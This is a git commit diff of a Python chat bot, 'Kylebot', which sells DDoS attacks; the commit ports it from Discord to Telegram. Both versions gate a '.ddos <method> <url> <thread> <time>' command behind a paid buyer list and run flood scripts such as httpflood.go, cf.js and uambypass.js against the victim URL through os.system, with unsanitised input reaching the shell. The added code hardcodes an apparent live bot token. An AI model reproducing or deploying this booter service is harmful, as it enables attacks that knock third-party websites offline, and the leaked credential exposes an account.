db65ff7a4adcef4f7b91642a26c62b0ff83fd791
kevinkumar2001 <kevinkum.ar0a2@gmail.com>
2024-06-29 23:32:39 +0530

    Update bot.py

--- bot.py
+++ bot.py
@@ -2,241 +2,162 @@ __author__ = 'Kyle Tran'
 __version__ = '1.2'
 __github__ = 'github.com/kyletran191'
 __license__ = 'GNU General Public License v3.0'
-# Kylebot | Discord ddos bot v1.2 | Kyle Tran
+# Kylebot | Telegram DDoS Bot v1.2 | Kyle Tran
 #=====Import Module=====#
 import os
 try:
-	import discord
+    from telegram import Update, Bot, ParseMode
+    from telegram.ext import Updater, CommandHandler, CallbackContext
 except ImportError:
-	os.system("pip install discord")
+    os.system("pip install python-telegram-bot")
 try:
-	import colorama
+    import colorama
 except ImportError:
-	os.system("pip install colorama")
-from discord.ext import commands    
-from discord.ext.commands import Bot 
-from os import system        
-from os import name                  
-from colorama import *                                                
-import random, datetime, discord                        
+    os.system("pip install colorama")
+from colorama import *
+import random, datetime
 #=====User && Methods Setting=====#
-buyers  = [920122047311540294]  #          
-admins  = [920122047311540294]  #   ID users            
-owners  = [920122047311540294]  #          
+buyers  = [6300393008]  #          
+admins  = [6300393008]  #   ID users            
+owners  = [6300393008]  #          
 methods = ['HTTP-FLOOD', 'HTTP-RAW', 'HTTP-RAND', 'HTTP-SOCKET','CLOUDFLARE','UAM-BYPASS','SLOW'] # Methods
 year_now= datetime.datetime.now().strftime("%Y")     
-token   = '' # paste your token here
-intents = discord.Intents.default()
-intents.members = True 
-intents.message_content = True
-intents.messages = True
-intents.dm_messages = True       
-bot     = commands.Bot(command_prefix='.', intents=intents)
-bot.remove_command("help")    
+token   = '7013561811:AAHwt1VzTAlbpd-AyvpbbaFBqd5-p927XjI' # paste your token here
+bot     = Bot(token=token)
+updater = Updater(token=token, use_context=True)
+dispatcher = updater.dispatcher
 #=====Random Color=====#
-async def random_color():
+def random_color():
     number_lol = random.randint(1, 999999)
     while len(str(number_lol)) != 6:
         number_lol = int(str(f'{random.randint(1, 9)}{number_lol}'))
     return number_lol
 #=====Bot Command=====#
-@bot.command()
-async def help(ctx):
-        embed = discord.Embed(title="Kyle Network | DDoS Methods", description=f"DDoS Methods | {ctx.author.mention}", color=await random_color())
-        embed.add_field(name = "**All Methods**", value = f"```yaml\nHTTP-FLOOD\nHTTP-RAW\nHTTP-RAND\nHTTP-SOCKET\nCLOUDFLARE\nUAM-BYPASS\nSLOW```")
-        embed.add_field(name = "**Syntax**", value = "```md\n.ddos <method> <url> <thread> <time>```")
-        embed.add_field(name = "**NOTE**", value = "> __**Don't spam**__ the attacks or your plan\n > __will be **removed**__.\n\n> Regards, \n> Kyle Network.")
-        embed.set_footer(text = f"©{year_now} Copyright Kyle Tran.")
-        await ctx.send(embed=embed)
-@bot.command()
-async def add_buyer(ctx, buyer : int = None):
-    if ctx.author.id not in admins:
-        await ctx.send(f'Sorry, {ctx.author}, but you aren\'t an admin!')
+def help(update: Update, context: CallbackContext):
+    help_text = (
+        "Kyle Network | DDoS Methods\n"
+        f"DDoS Methods | @{update.message.from_user.username}\n"
+        "All Methods:\n"
+        "HTTP-FLOOD\nHTTP-RAW\nHTTP-RAND\nHTTP-SOCKET\nCLOUDFLARE\nUAM-BYPASS\nSLOW\n"
+        "Syntax:\n"
+        ".ddos <method> <url> <thread> <time>\n"
+        "NOTE:\n"
+        "> Don't spam the attacks or your plan will be removed.\n\n"
+        "Regards,\n"
+        "Kyle Network.\n"
+        f"©{year_now} Copyright Kyle Tran."
+    )
+    update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)
 
+def add_buyer(update: Update, context: CallbackContext):
+    buyer = context.args[0] if context.args else None
+    if update.message.from_user.id not in admins:
+        update.message.reply_text(f'Sorry, @{update.message.from_user.username}, but you aren\'t an admin!')
     elif buyer in buyers:
-        await ctx.send(f'{buyer} has already copped a spot!')
-
+        update.message.reply_text(f'{buyer} has already copped a spot!')
     elif buyer is None:
-        await ctx.send('Please give a buyer!!')
-
+        update.message.reply_text('Please provide a buyer ID!')
     else:
-        buyers.append(buyer)
-        await ctx.send('Added him/her!!')
+        buyers.append(int(buyer))
+        update.message.reply_text('Added buyer!')
 
-@bot.command()
-async def delete_buyer(ctx, buyer : int = None):
-    if ctx.author.id not in admins:
-        await ctx.send(f'Sorry, {ctx.author}, but you aren\'t an admin!')
-
+def delete_buyer(update: Update, context: CallbackContext):
+    buyer = context.args[0] if context.args else None
+    if update.message.from_user.id not in admins:
+        update.message.reply_text(f'Sorry, @{update.message.from_user.username}, but you aren\'t an admin!')
     elif buyer not in buyers:
-        await ctx.send(f'{buyer} did not cop a spot!')
-
+        update.message.reply_text(f'{buyer} did not cop a spot!')
     elif buyer is None:
-        await ctx.send('Please give a buyer!!')
-
+        update.message.reply_text('Please provide a buyer ID!')
     else:
-        buyers.remove(buyer)
-        await ctx.send('Removed him/her!!')
-        
-@bot.command()
-async def add_admin(ctx, admin : int = None):
-    if ctx.author.id not in owners:
-        await ctx.send(f'Sorry, {ctx.author}, but you aren\'t an owner!')
+        buyers.remove(int(buyer))
+        update.message.reply_text('Removed buyer!')
 
+def add_admin(update: Update, context: CallbackContext):
+    admin = context.args[0] if context.args else None
+    if update.message.from_user.id not in owners:
+        update.message.reply_text(f'Sorry, @{update.message.from_user.username}, but you aren\'t an owner!')
     elif admin in admins:
-        await ctx.send(f'{admin} is already an admin!')
-
+        update.message.reply_text(f'{admin} is already an admin!')
     elif admin is None:
-        await ctx.send('Please give an admin!!')
-
+        update.message.reply_text('Please provide an admin ID!')
     else:
-        admins.append(admin)
-        await ctx.send('Added him/her!!')
+        admins.append(int(admin))
+        update.message.reply_text('Added admin!')
 
-@bot.command()
-async def delete_admin(ctx, admin : int = None):
-    if ctx.author.id not in owners:
-        await ctx.send(f'Sorry, {ctx.author}, but you aren\'t an owner!')
-
+def delete_admin(update: Update, context: CallbackContext):
+    admin = context.args[0] if context.args else None
+    if update.message.from_user.id not in owners:
+        update.message.reply_text(f'Sorry, @{update.message.from_user.username}, but you aren\'t an owner!')
     elif admin not in admins:
-        await ctx.send(f'{admin} is not an admin')
-
+        update.message.reply_text(f'{admin} is not an admin!')
     elif admin is None:
-        await ctx.send('Please give an admin!!')
-
+        update.message.reply_text('Please provide an admin ID!')
     else:
-        admins.remove(admin)
-        await ctx.send('Removed him/her!!')
+        admins.remove(int(admin))
+        update.message.reply_text('Removed admin!')
 
-@bot.command()
-async def ddos(ctx, method : str = None, victim : str = None, thread : str = None, time : str = None):
-    if ctx.author.id not in buyers: 
-        embed = discord.Embed(title=f"Error! ", description="Sorry, you need to buy a spot!", color=await random_color())
-        await ctx.send(embed=embed)
-    else:
-        if method is None:
-            embed = discord.Embed(title=f"Error!", description=f"You need a method! {ctx.author.mention}", color=await random_color())
-            await ctx.send(embed=embed)
-        elif method.upper() not in methods:
-            embed = discord.Embed(title="Error!", description=f"Invalid method!! {ctx.author.mention}", color=await random_color())
-            await ctx.send(embed=embed)
-        elif victim is None:
-            embed = discord.Embed(title="Error!", description=f"You need a url! {ctx.author.mention}", color=await random_color())
-            await ctx.send(embed=embed)
-        elif thread is None:
-            embed = discord.Embed(title="Error!", description=f"You need a thread! {ctx.author.mention}", color=await random_color())
-            await ctx.send(embed=embed)
-        elif time is None:
-            embed = discord.Embed(title="Error!", description=f"You need a time! {ctx.author.mention}", color=await random_color())
-            await ctx.send(embed=embed)
-        else:
-                max_time = int(300)
-                max_thread = int(50000)
-                if int(time) > max_time:
-                    time2 = max_time
-                else:
-                    time2 = int(time)
-                if int(thread) > max_thread:
-                    thread2 = max_thread
-                else:
-                    thread2 = int(thread)
-                if method == 'HTTP-FLOOD':
-                    embed = discord.Embed(title=f"Kyle Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
-                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
-                    embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
-                    embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
-                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
-                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
-                    embed.set_footer(text = f"©{year_now} Copyright Kyle Tran.")
-                    await ctx.send(embed=embed)
-                    system(f'go run httpflood.go {victim} {thread2} get {time2} nil')
-                elif method == 'HTTP-RAW':
-                    embed = discord.Embed(title=f"Kyle Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
-                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
-                    embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
-                    embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
-                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
-                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
-                    embed.set_footer(text = f"©{year_now} Copyright Kyle Tran.")
-                    await ctx.send(embed=embed)
-                    system(f'node HTTP-RAW.js {victim} {time2}')
-                elif method == 'HTTP-RAND':
-                    embed = discord.Embed(title=f"Kyle Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
-                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
-                    embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
-                    embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
-                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
-                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
-                    embed.set_footer(text = f"©{year_now} Copyright Kyle Tran.")
-                    await ctx.send(embed=embed)
-                    system(f'node HTTP-RAND.js {victim} {time2}')
-                elif method == 'HTTP-SOCKET':
-                    embed = discord.Embed(title=f"Kyle Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
-                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
-                    embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
-                    embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
-                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
-                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
-                    embed.set_footer(text = f"©{year_now} Copyright Kyle Tran.")
-                    await ctx.send(embed=embed)
-                    system(f'node HTTP-SOCKET.js {victim} 7000 {time2}')
-                elif method == 'CLOUDFLARE':
-                    embed = discord.Embed(title=f"Kyle Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
-                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
-                    embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
-                    embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
-                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
-                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
-                    embed.set_footer(text = f"©{year_now} Copyright Kyle Tran.")
-                    await ctx.send(embed=embed)
-                    system(f'node cf.js {victim} {time2} {thread2}')
-                elif method == 'UAM-BYPASS':
-                    embed = discord.Embed(title=f"Kyle Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
-                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
-                    embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
-                    embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
-                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
-                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
-                    embed.set_footer(text = f"©{year_now} Copyright Kyle Tran.")
-                    await ctx.send(embed=embed)
-                    system(f'node uambypass.js {victim} {time2} 2000 http.txt')
-                elif method == 'SLOW':
-                    embed = discord.Embed(title=f"Kyle Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
-                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
-                    embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
-                    embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
-                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
-                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
-                    embed.set_footer(text = f"©{year_now} Copyright Kyle Tran.")
-                    await ctx.send(embed=embed)
-                    system(f'node slow.js {victim} {time2}')
+def ddos(update: Update, context: CallbackContext):
+    args = context.args
+    if len(args) < 4:
+        update.message.reply_text("Invalid syntax! Use .ddos <method> <url> <thread> <time>")
+        return
 
-           
+    method, victim, thread, time = args
+    if update.message.from_user.id not in buyers:
+        update.message.reply_text(f"Sorry, you need to buy a spot, @{update.message.from_user.username}!")
+    elif method.upper() not in methods:
+        update.message.reply_text(f"Invalid method: {method}")
+    else:
+        max_time = 300
+        max_thread = 50000
+        time2 = min(int(time), max_time)
+        thread2 = min(int(thread), max_thread)
+        ddos_text = (
+            f"Kyle Network | DDoS Attack Sent\n"
+            f"Attack Sent! @{update.message.from_user.username}\n"
+            f"Method: {method}\n"
+            f"Thread: {thread2}\n"
+            f"Time: {time2}\n"
+            f"Target: {victim}\n"
+            f"©{year_now} Copyright Kyle Tran."
+        )
+        update.message.reply_text(ddos_text, parse_mode=ParseMode.MARKDOWN)
 
-@bot.event
-async def on_ready():
-    banner = f"""
-\033[1;96mdb   dD db    db db      d88888b   d8888b.  .d88b.  d888888b 
-\033[1;97m88 ,8P' `8b  d8' 88      88'       88  `8D .8P  Y8. `~~88~~' 
-\033[1;92m88,8P    `8bd8'  88      88ooooo   88oooY' 88    88    88    
-\033[1;93m88`8b      88    88      88~~~~~   88~~~b. 88    88    88    
-\033[1;96m88 `88.    88    88booo. 88.       88   8D `8b  d8'    88    
-\033[1;97mYP   YD    YP    Y88888P Y88888P   Y8888P'  `Y88P'     YP 
-\033[1;92m                                      @kyletran191
-\033[1;97m=============================================================
-    """
-    if name == 'nt':
-        system('cls')
-    else:
-        system('clear')
-    print(banner)
-    print(f'\033[1;97mLogged \033[1;96m{bot.user.name}')
-    print(f'\033[1;97mBot ID: \033[1;97m{bot.user.id}')
-    print('\033[1;97m=============================================================')
-    if str(len(bot.guilds)) == 1:
-        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{len(bot.guilds)} server!"))
-    else:
-        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{len(bot.guilds)} servers!"))
+        if method.upper() == 'HTTP-FLOOD':
+            os.system(f'go run httpflood.go {victim} {thread2} get {time2} nil')
+        elif method.upper() == 'HTTP-RAW':
+            os.system(f'node HTTP-RAW.js {victim} {time2}')
+        elif method.upper() == 'HTTP-RAND':
+            os.system(f'node HTTP-RAND.js {victim} {time2}')
+        elif method.upper() == 'HTTP-SOCKET':
+            os.system(f'node HTTP-SOCKET.js {victim} 7000 {time2}')
+        elif method.upper() == 'CLOUDFLARE':
+            os.system(f'node cf.js {victim} {time2} {thread2}')
+        elif method.upper() == 'UAM-BYPASS':
+            os.system(f'node uambypass.js {victim} {time2} 2000 http.txt')
+        elif method.upper() == 'SLOW':
+            os.system(f'node slow.js {victim} {time2}')
+
+def start(update: Update, context: CallbackContext):
+    start_text = (
+        f"Bot started!\n"
+        f"Logged in as: {bot.username}\n"
+        f"Bot ID: {bot.id}\n"
+        f"Watching {len(bot.get_updates())} servers!\n"
+        "Type /help to see the commands."
+    )
+    update.message.reply_text(start_text)
+
+dispatcher.add_handler(CommandHandler("start", start))
+dispatcher.add_handler(CommandHandler("help", help))
+dispatcher.add_handler(CommandHandler("add_buyer", add_buyer))
+dispatcher.add_handler(CommandHandler("delete_buyer", delete_buyer))
+dispatcher.add_handler(CommandHandler("add_admin", add_admin))
+dispatcher.add_handler(CommandHandler("delete_admin", delete_admin))
+dispatcher.add_handler(CommandHandler("ddos", ddos))
+
 if __name__ == '__main__':
     init(convert=True)
-    bot.run(token)
+    updater.start_polling()
+    updater.idle()
